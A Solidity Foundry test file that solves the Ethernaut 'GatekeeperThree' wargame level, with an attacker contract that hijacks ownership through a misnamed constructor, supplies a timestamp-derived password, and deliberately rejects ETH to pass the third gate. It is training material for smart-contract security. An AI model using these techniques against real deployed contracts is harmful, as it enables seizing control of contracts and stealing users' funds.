// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperThree} from "../src/levels/GatekeeperThree.sol";

/// Ethernaut #28 "GatekeeperThree" → SC01 access / multi-gate (no exact catalog entry).
/// gateOne: become owner via the misnamed `construct0r()`, call from a contract (tx.origin != owner).
/// gateTwo: pass the trick's password (it's `block.timestamp` at trick creation) to flip allowEntrance.
/// gateThree: contract balance > 0.001 ether AND `send` to owner fails — so the owner (our contract)
/// must reject ETH. Win: entrant == player.
contract GatekeeperThreeAttacker {
    function attack(GatekeeperThree gk) external {
        gk.construct0r(); // owner = this
        gk.createTrick();
        gk.getAllowance(block.timestamp); // password == block.timestamp -> allowEntrance = true
        (bool s,) = address(gk).call{value: 0.0011 ether}(""); // fund > 0.001 ether
        require(s, "fund failed");
        gk.enter(); // gateThree's send to us fails (no receive) -> body runs
    }
    // intentionally NO receive(): makes send(owner) fail, satisfying gateThree
}

contract GatekeeperThreeTest is Test {
    address player = makeAddr("player");

    function test_solve_gatekeeperThree() public {
        GatekeeperThree lvl = new GatekeeperThree();
        GatekeeperThreeAttacker a = new GatekeeperThreeAttacker();
        vm.deal(address(a), 1 ether);
        vm.prank(player, player); // tx.origin = player
        a.attack(lvl);
        assertEq(lvl.entrant(), player, "passed all three gates");
    }
}
